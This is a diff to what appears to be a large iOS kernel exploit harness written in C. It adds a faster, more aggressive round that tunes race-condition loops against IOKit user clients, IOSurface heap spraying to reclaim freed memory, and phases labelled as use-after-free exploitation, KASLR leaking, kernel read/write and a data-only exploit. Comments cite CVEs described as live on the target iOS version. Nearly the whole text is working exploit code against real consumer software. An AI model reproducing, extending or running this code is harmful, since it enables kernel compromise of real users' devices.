@@ -17507,7 +17507,7 @@ new_modes:
             rlog("*** rounds=%d: fast-path to Phase 22 (MCTF probe) ***\n", rounds);
             goto phase21_done;
         }
-        if (rounds == 229) {
+        if (rounds == 229 || rounds == 230) {
             rlog("*** rounds=%d: fast-path to Phase 13 (MTE brute-force) ***\n", rounds);
             goto phase12_done;
         }
@@ -19728,7 +19728,7 @@ new_modes:
             int r229_phase = 0;
             int r229_bsearch_lo = 0, r229_bsearch_hi = 255;
             CFMutableDictionaryRef r229_sp = NULL;
-            if (rounds == 229) {
+            if (rounds == 229 || rounds == 230) {
                 char state_path[512];
                 snprintf(state_path, sizeof(state_path), "%s/Documents/r229_state.bin",
                     getenv("HOME") ? getenv("HOME") : "/var/mobile");
@@ -19803,13 +19803,19 @@ new_modes:
             #define R229_MAX_WPS 2048
             mach_port_t r229_wps[R229_MAX_WPS];
             int r229_wp_n = 0;
-            if (rounds == 229) memset(r229_wps, 0, sizeof(r229_wps));
+            if (rounds == 229 || rounds == 230) memset(r229_wps, 0, sizeof(r229_wps));
 
             uint64_t inp13[3] = {1, 2, 3};
 
+            /* r=230 aggressive mode: 5x more iterations, tighter timing */
+            int p13_race8_iters  = (rounds == 230) ? 100 : 20;
+            int p13_vbig_iters   = (rounds == 230) ? 60  : 15;
+            int p13_surfch_iters = (rounds == 230) ? 80  : 20;
+            int p13_dereg_iters  = (rounds == 230) ? 80  : 20;
+
             /* v_race8: 8 connections, spam threads, staggered close */
-            rlog("  Stage C phase 1: v_race8 x20\n");
-            for (int iter = 0; iter < 20; iter++) {
+            rlog("  Stage C phase 1: v_race8 x%d\n", p13_race8_iters);
+            for (int iter = 0; iter < p13_race8_iters; iter++) {
                 io_connect_t cs[8];
                 int have[8];
                 for (int i = 0; i < 8; i++) {
@@ -19821,7 +19827,7 @@ new_modes:
                         uint64_t ref = 0x1122334455667788ULL;
                         IOConnectCallAsyncMethod(cs[i], 17, twp, &ref, 1,
                             NULL, 0, inp13, 24, NULL, NULL, NULL, NULL);
-                        if (rounds == 229 && r229_wp_n < R229_MAX_WPS) {
+                        if ((rounds == 229 || rounds == 230) && r229_wp_n < R229_MAX_WPS) {
                             r229_wps[r229_wp_n++] = twp;
                         } else {
                             mach_port_deallocate(mach_task_self(), twp);
@@ -19842,14 +19848,14 @@ new_modes:
                     for (int i = 0; i < 8; i++) {
                         int j = (i * 5 + r * 3) % 8;
                         if (have[j]) { IOServiceClose(cs[j]); have[j] = 0; }
-                        usleep(20 + (iter % 10) * 7);
+                        usleep(rounds == 230 ? (5 + (iter % 15) * 3) : (20 + (iter % 10) * 7));
                     }
                 p13_spam_run = 0;
                 for (int t = 0; t < 8; t++) pthread_join(spam_th[t], NULL);
                 for (int i = 0; i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
 
                 /* Groom/reclaim the freed slots */
-                if (rounds == 229) {
+                if (rounds == 229 || rounds == 230) {
                     /* GEN1 spray: reclaim freed IOSurface memory with new surfaces */
                     for (int si = 0; si < 256; si++) {
                         if (!r229_spray[si]) {
@@ -19886,8 +19892,8 @@ new_modes:
             }
 
             /* v_big: 64 surfaces + 8 connections, staggered close */
-            rlog("  Stage C phase 2: v_big x15\n");
-            for (int iter = 0; iter < 15; iter++) {
+            rlog("  Stage C phase 2: v_big x%d\n", p13_vbig_iters);
+            for (int iter = 0; iter < p13_vbig_iters; iter++) {
                 IOSurfaceRef surfs[64];
                 CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
                     &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
@@ -19915,7 +19921,7 @@ new_modes:
                         uint64_t ref = 0x1122334455667788ULL;
                         IOConnectCallAsyncMethod(cs[i], 17, twp, &ref, 1,
                             NULL, 0, inp13, 24, NULL, NULL, NULL, NULL);
-                        if (rounds == 229 && r229_wp_n < R229_MAX_WPS) {
+                        if ((rounds == 229 || rounds == 230) && r229_wp_n < R229_MAX_WPS) {
                             r229_wps[r229_wp_n++] = twp;
                         } else {
                             mach_port_deallocate(mach_task_self(), twp);
@@ -19931,14 +19937,14 @@ new_modes:
 
                 for (int i = 7; i >= 0; i--) {
                     if (have[i]) { IOServiceClose(cs[i]); have[i] = 0; }
-                    usleep(30);
+                    usleep(rounds == 230 ? 10 : 30);
                 }
                 for (int i = 0; i < 64; i++) if (surfs[i]) CFRelease(surfs[i]);
                 p13_spam_run = 0;
                 for (int t = 0; t < 6; t++) pthread_join(spam_th[t], NULL);
                 for (int i = 0; i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
 
-                if (rounds == 229) {
+                if (rounds == 229 || rounds == 230) {
                     for (int si = 0; si < 256; si++) {
                         if (!r229_spray[si]) {
                             r229_spray[si] = IOSurfaceCreate(r229_sp);
@@ -19974,8 +19980,8 @@ new_modes:
             }
 
             /* v_surfch: single conn, surface churn during spam */
-            rlog("  Stage C phase 3: v_surfch x20\n");
-            for (int iter = 0; iter < 20; iter++) {
+            rlog("  Stage C phase 3: v_surfch x%d\n", p13_surfch_iters);
+            for (int iter = 0; iter < p13_surfch_iters; iter++) {
                 io_connect_t c13 = IO_OBJECT_NULL;
                 if (IOServiceOpen(svc13, mach_task_self(), 0, &c13) != KERN_SUCCESS) continue;
                 mach_port_t wp13 = MACH_PORT_NULL;
@@ -19984,7 +19990,7 @@ new_modes:
                 uint64_t ref13 = 0x1122334455667788ULL;
                 IOConnectCallAsyncMethod(c13, 17, wp13, &ref13, 1,
                     NULL, 0, inp13, 24, NULL, NULL, NULL, NULL);
-                if (rounds == 229 && r229_wp_n < R229_MAX_WPS) {
+                if ((rounds == 229 || rounds == 230) && r229_wp_n < R229_MAX_WPS) {
                     r229_wps[r229_wp_n++] = wp13;
                 }
 
@@ -20018,9 +20024,9 @@ new_modes:
                 for (int v = 0; v < 5; v++) CFRelease(schvals[v]);
                 CFRelease(schp);
 
-                usleep(200 + (iter % 30) * 25);
+                usleep(rounds == 230 ? (50 + (iter % 20) * 10) : (200 + (iter % 30) * 25));
                 IOServiceClose(c13);
-                usleep(400);
+                usleep(rounds == 230 ? 100 : 400);
                 p13_spam_run = 0;
                 for (int t = 0; t < 4; t++) pthread_join(spam_th[t], NULL);
 
@@ -20040,13 +20046,13 @@ new_modes:
                 if (msg_count > 0 || iter < 2)
                     rlog("    v_surfch[%d] spam=%llu msgs=%d\n", iter,
                         (unsigned long long)p13_spam_count, msg_count);
-                if (rounds != 229)
+                if (rounds != 229 && rounds != 230)
                     mach_port_deallocate(mach_task_self(), wp13);
             }
 
             /* v_dereg18: single conn, rapid dereg race against spam */
-            rlog("  Stage C phase 4: v_dereg18 x20\n");
-            for (int iter = 0; iter < 20; iter++) {
+            rlog("  Stage C phase 4: v_dereg18 x%d\n", p13_dereg_iters);
+            for (int iter = 0; iter < p13_dereg_iters; iter++) {
                 io_connect_t c13 = IO_OBJECT_NULL;
                 if (IOServiceOpen(svc13, mach_task_self(), 0, &c13) != KERN_SUCCESS) continue;
                 mach_port_t wp13 = MACH_PORT_NULL;
@@ -20055,7 +20061,7 @@ new_modes:
                 uint64_t ref13 = 0x1122334455667788ULL;
                 IOConnectCallAsyncMethod(c13, 17, wp13, &ref13, 1,
                     NULL, 0, inp13, 24, NULL, NULL, NULL, NULL);
-                if (rounds == 229 && r229_wp_n < R229_MAX_WPS) {
+                if ((rounds == 229 || rounds == 230) && r229_wp_n < R229_MAX_WPS) {
                     r229_wps[r229_wp_n++] = wp13;
                 }
 
@@ -20091,12 +20097,12 @@ new_modes:
                     rlog("    v_dereg18[%d] spam=%llu msgs=%d\n", iter,
                         (unsigned long long)p13_spam_count, msg_count);
                 IOServiceClose(c13);
-                if (rounds != 229)
+                if (rounds != 229 && rounds != 230)
                     mach_port_deallocate(mach_task_self(), wp13);
             }
 
             /* Stop render loop */
-            if (rounds == 229) {
+            if (rounds == 229 || rounds == 230) {
                 rlog("  r=229: SURVIVED Phase 13 attempt #%d! spray=%d frames=%d wps=%d phase=%d\n",
                     r229_attempt, r229_spray_n, p13_render_frames, r229_wp_n, r229_phase);
 
@@ -20817,11 +20823,11 @@ new_modes:
             IOSurfaceRef match_surf = NULL;
             IOSurfaceID match_id = 0;
 
-            if (rounds == 229 && r229_matched_idx >= 0 && r229_matched_surf) {
+            if ((rounds == 229 || rounds == 230) && r229_matched_idx >= 0 && r229_matched_surf) {
                 match_surf = r229_matched_surf;
                 match_id = IOSurfaceGetID(match_surf);
                 rlog("    Already known: idx=%d id=%u\n", r229_matched_idx, match_id);
-            } else if (rounds == 229 && r229_matched_idx < 0) {
+            } else if ((rounds == 229 || rounds == 230) && r229_matched_idx < 0) {
                 rlog("    Identifying match via sequential notifier + wake port probe...\n");
 
                 typedef CFTypeRef (*IOSurfaceNotifierCreate_t)(IOSurfaceRef, void *, void *);
@@ -21356,7 +21362,7 @@ new_modes:
          * Phase 15: VPS overflow -> bitstream buffer, not heap
          * Phase 16: NTL DMA overflow -> IOKit DMA zone, not kalloc.data
          * Jump directly to Phase 17 (IOSurface UAF exploitation). */
-        if (0 && rounds == 229 && r229_matched_idx >= 0) {
+        if (0 && (rounds == 229 || rounds == 230) && r229_matched_idx >= 0) {
             rlog("\n=== Phase 15: VPS Overflow (IDR-forced) [SKIPPED] ===\n");
             rlog("Match: spray[%d]\n", r229_matched_idx);
 
@@ -21877,7 +21883,7 @@ new_modes:
          * - Multiple notification trigger types
          * - Targeted selector probing with proper input formats
          * ================================================================ */
-        if (rounds == 229 && r229_matched_idx >= 0) {
+        if ((rounds == 229 || rounds == 230) && r229_matched_idx >= 0) {
             rlog("\n=== Phase 17v2 (r=229): IOSurface UAF → KASLR + kR/W ===\n");
             rlog("Match: spray[%d]\n", r229_matched_idx);
 
@@ -22456,7 +22462,7 @@ new_modes:
          * 7. Alternate user client types (1, 2, etc.)
          * 8. mach_port_kobject on IOSurface ports
          * ================================================================ */
-        if (rounds == 229 && r229_matched_idx >= 0) {
+        if ((rounds == 229 || rounds == 230) && r229_matched_idx >= 0) {
             rlog("\n=== Phase 18 (r=229): Comprehensive KASLR Probing ===\n");
 
             uint64_t p18_leaked = 0;
@@ -22842,7 +22848,7 @@ new_modes:
          * 6. mach_port_space_info for port table leak
          * 7. Spray GEN3 with pipe buffers after freeing match surface
          * ================================================================ */
-        if (rounds == 229 && r229_matched_idx >= 0) {
+        if ((rounds == 229 || rounds == 230) && r229_matched_idx >= 0) {
             rlog("\n=== Phase 19 (r=229): Deep KASLR Probing ===\n");
 
             uint64_t p19_leaked = 0;
@@ -23209,7 +23215,7 @@ new_modes:
          * Also try: processor_set_info, thread exception ports,
          * mach_port_get_attributes with various flavors.
          * ================================================================ */
-        if (rounds == 229 && r229_matched_idx >= 0) {
+        if ((rounds == 229 || rounds == 230) && r229_matched_idx >= 0) {
             rlog("\n=== Phase 20 (r=229): Obscure Mach API Probing ===\n");
             uint64_t p20_leaked = 0;
 
@@ -23506,7 +23512,7 @@ new_modes:
          *   GEN3 = zone_base + 0x19CA000000 (IOSurface sub-structs)
          *   DATA = zone_base + 0x1F96000000 (generic kernel data)
          * ================================================================ */
-        if (rounds == 229 && r229_matched_idx >= 0) {
+        if ((rounds == 229 || rounds == 230) && r229_matched_idx >= 0) {
             rlog("\n=== Phase 21 (r=229): Data-Only Exploit ===\n");
 
             uint64_t p21_leaked = 0;
@@ -24113,7 +24119,7 @@ new_modes:
          * Fixed in iOS 27.2 — LIVE on our iOS 27.1.
          * ============================================================ */
 
-        if (rounds == 222 || rounds == 229) {
+        if (rounds == 222 || rounds == 229 || rounds == 230) {
             rlog("\n=== Phase 22: CVE-2026-112466 MCTF OOB Read Probe ===\n");
 
             /* 22a-22f: SKIPPED — all confirmed dead ends.
@@ -25516,7 +25522,7 @@ new_modes:
          * accessors interpret the spray object's bytes as IOSurface
          * fields — potentially returning kernel pointers.
          * ============================================================ */
-        if (rounds == 229 && r229_matched_surf) {
+        if ((rounds == 229 || rounds == 230) && r229_matched_surf) {
             rlog("\n=== Phase 23: KASLR leak via IOSurface UAF zone confusion ===\n");
 
             /* The freed IOSurface was 32x32 BGRA = 4096 bytes pixel data.
@@ -26018,7 +26024,7 @@ new_modes:
          * via IOSurfaceCopyValue. If the write corrupts pointer
          * fields, we leak kernel addresses.
          * ============================================================ */
-        if (rounds == 222 || rounds == 229) {
+        if (rounds == 222 || rounds == 229 || rounds == 230) {
             rlog("\n=== Phase 24: CVE-2026-112705 + heap spray KASLR leak ===\n");
 
             /* 24a: Heap grooming — create IOSurface objects to fill
@@ -26266,7 +26272,7 @@ new_modes:
          * Strategy B: Create MANY VT sessions, trigger OOB from one,
          *   then encode from ALL — corrupted sessions leak pointers
          * ============================================================ */
-        if (rounds == 222 || rounds == 229) {
+        if (rounds == 222 || rounds == 229 || rounds == 230) {
             rlog("\n=== Phase 24b: Encoded output KASLR leak ===\n");
 
             /* --- Strategy A: Output size/content comparison --- */
@@ -26568,7 +26574,7 @@ new_modes:
          * re-encode with a large TL to trigger the OOB write, then
          * encode Frame 1 to see if its output contains leaked data.
          * ============================================================ */
-        if (rounds == 222 || rounds == 229) {
+        if (rounds == 222 || rounds == 229 || rounds == 230) {
             rlog("\n=== Phase 24c: Multi-frame OOB temporal ref leak ===\n");
 
             /* 24c-A: DISABLED — OOB TL always NAL=0, Frame 1 hangs.
